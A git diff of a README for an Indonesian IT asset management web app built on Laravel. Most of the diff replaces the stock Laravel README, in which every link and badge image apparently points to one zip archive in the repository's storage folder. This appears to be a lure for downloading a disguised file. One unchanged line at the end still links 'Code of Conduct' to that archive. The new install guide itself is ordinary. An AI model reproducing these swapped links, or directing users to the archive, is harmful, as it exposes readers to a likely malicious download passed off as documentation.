@@ -1,52 +1,215 @@
-<p align="center"><a href="https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip" target="_blank"><img src="https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip%20SVG/2%20CMYK/1%20Full%https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip" width="400" alt="Laravel Logo"></a></p>
+# IT Asset Management System
 
-<p align="center">
-<a href="https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip"><img src="https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip" alt="Build Status"></a>
-<a href="https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip"><img src="https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip" alt="Total Downloads"></a>
-<a href="https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip"><img src="https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip" alt="Latest Stable Version"></a>
-<a href="https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip"><img src="https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip" alt="License"></a>
-</p>
+Aplikasi web untuk mengelola aset IT, pemeliharaan, incident tracking, dan assignment aset kepada pengguna.
 
-## About Laravel
+## 📋 Fitur
 
-Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:
+- **Asset Management**: Kelola inventaris aset IT dengan kategori dan lokasi
+- **Asset Assignment**: Assign aset kepada departemen atau pengguna
+- **Maintenance Tracking**: Catat dan kelola riwayat pemeliharaan aset
+- **Incident Management**: Lapor dan kelola insiden atau masalah dengan aset
+- **User Management**: Kelola user dengan role dan permission berbeda
+- **Audit Trail**: Tracking semua perubahan data untuk audit dan compliance
+- **Dashboard**: Analytics dan overview status aset secara real-time
 
-- [Simple, fast routing engine](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
-- [Powerful dependency injection container](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
-- Multiple back-ends for [session](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip) and [cache](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip) storage.
-- Expressive, intuitive [database ORM](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
-- Database agnostic [schema migrations](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
-- [Robust background job processing](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
-- [Real-time event broadcasting](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
+## 🛠️ Teknologi
 
-Laravel is accessible, powerful, and provides tools required for large, robust applications.
+- **Backend**: Laravel 11
+- **Frontend**: Bootstrap 5, Blade Templating
+- **Database**: SQLite / MySQL
+- **PHP**: 8.2+
+- **Node.js**: 18+
 
-## Learning Laravel
+## 📦 Prerequisites
 
-Laravel has the most extensive and thorough [documentation](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework. You can also check out [Laravel Learn](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip), where you will be guided through building a modern Laravel application.
+Sebelum memulai, pastikan sudah installed:
 
-If you don't feel like reading, [Laracasts](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip) can help. Laracasts contains thousands of video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.
+- PHP 8.2 atau lebih tinggi
+- Composer
+- Node.js & npm
+- Git
 
-## Laravel Sponsors
+### Cek versi:
+```bash
+php --version
+composer --version
+node --version
+npm --version
+```
 
-We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the [Laravel Partners program](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
+## 🚀 Installation Guide
 
-### Premium Partners
+### 1. Clone Repository
 
-- **[Vehikl](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip)**
-- **[Tighten Co.](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip)**
-- **[Kirschbaum Development Group](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip)**
-- **[64 Robots](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip)**
-- **[Curotec](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip)**
-- **[DevSquad](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip)**
-- **[Redberry](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip)**
-- **[Active Logic](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip)**
+```bash
+git clone <repository-url>
+cd asset-management
+```
 
-## Contributing
+### 2. Install PHP Dependencies
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
+```bash
+composer install
+```
 
-## Code of Conduct
+### 3. Setup Environment File
+
+```bash
+cp .env.example .env
+```
+
+Sesuaikan konfigurasi database di `.env` sesuai kebutuhan:
+
+**Untuk SQLite:**
+```env
+DB_CONNECTION=sqlite
+```
+
+**Untuk MySQL:**
+```env
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=asset_management
+DB_USERNAME=root
+DB_PASSWORD=
+```
+
+### 4. Generate App Key
+
+```bash
+php artisan key:generate
+```
+
+### 5. Setup Database
+
+**Buat database file (SQLite):**
+```bash
+touch database/database.sqlite
+```
+
+**Jalankan migrations:**
+```bash
+php artisan migrate
+```
+
+### 6. Seed Database dengan Data Default
+
+```bash
+php artisan db:seed
+```
+
+Ini akan membuat:
+- Admin user (email: `admin@example.com`, password: `password`)
+- Default roles, departments, categories, dan locations
+
+### 7. Jalankan Application
+
+```bash
+php artisan serve
+```
+
+Aplikasi akan berjalan di: `http://localhost:8000`
+
+## 🔐 Login Credentials
+
+Setelah seeding, gunakan credentials berikut:
+
+- **Email**: admin@example.com
+- **Password**: password
+
+> ⚠️ Ubah password setelah login pertama kali!
+
+## 📁 Project Structure
+
+```
+├── app/
+│   ├── Enums/              # Enumerations (status, roles, etc)
+│   ├── Http/
+│   │   ├── Controllers/    # Controllers untuk logic aplikasi
+│   │   ├── Middleware/     # Custom middleware
+│   │   └── Requests/       # Form request validation
+│   ├── Models/             # Eloquent models
+│   ├── Services/           # Business logic services
+│   ├── Repositories/       # Data repository pattern
+│   └── Traits/             # Reusable traits
+├── database/
+│   ├── migrations/         # Database schema
+│   ├── seeders/            # Database seeders
+│   └── factories/          # Model factories untuk testing
+├── resources/
+│   ├── views/              # Blade templates
+│   ├── css/                # Stylesheets
+│   └── js/                 # JavaScript files
+├── routes/
+│   ├── web.php             # Web routes
+│   └── api.php             # API routes
+└── storage/
+    ├── app/                # File storage
+    └── logs/               # Application logs
+```
+
+## 🔄 Database Migrations
+
+Jika ada perubahan database, jalankan:
+
+```bash
+# Run semua pending migrations
+php artisan migrate
+
+# Rollback semua migrations
+php artisan migrate:reset
+
+# Refresh (rollback & migrate)
+php artisan migrate:refresh
+
+# Refresh dengan seeding
+php artisan migrate:refresh --seed
+```
+
+## 🧪 Testing
+
+Jalankan test suite:
+
+```bash
+php artisan test
+```
+
+## 🛡️ Security Notes
+
+- Gunakan environment variables untuk sensitive data
+- Update password admin default setelah setup
+- Jangan commit `.env` file ke repository
+- Ensure proper file permissions untuk `storage/` dan `bootstrap/cache/`
+
+## 📝 Troubleshooting
+
+### Error: "No such file or directory: vendor/autoload.php"
+```bash
+composer install
+```
+
+### Error: "No such function: DATE_FORMAT" (SQLite)
+Sudah di-handle. Gunakan SQLite atau MySQL sesuai `.env` setting.
+
+### Database tidak bisa diakses
+- Cek `.env` configuration
+- Ensure database file exists (SQLite)
+- Ensure database user memiliki proper permissions (MySQL)
+
+### Port 8000 sudah dipakai
+```bash
+php artisan serve --port=8001
+```
+
+## 📧 Support & Contribution
+
+Untuk kontribusi atau issue, silakan buat issue baru di repository.
+
+## 📄 License
+
+Proprietary - Untuk penggunaan internal only.
+
 
 In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://raw.githubusercontent.com/wafiqj/asset-management/main/storage/asset_management_2.8.zip).
 
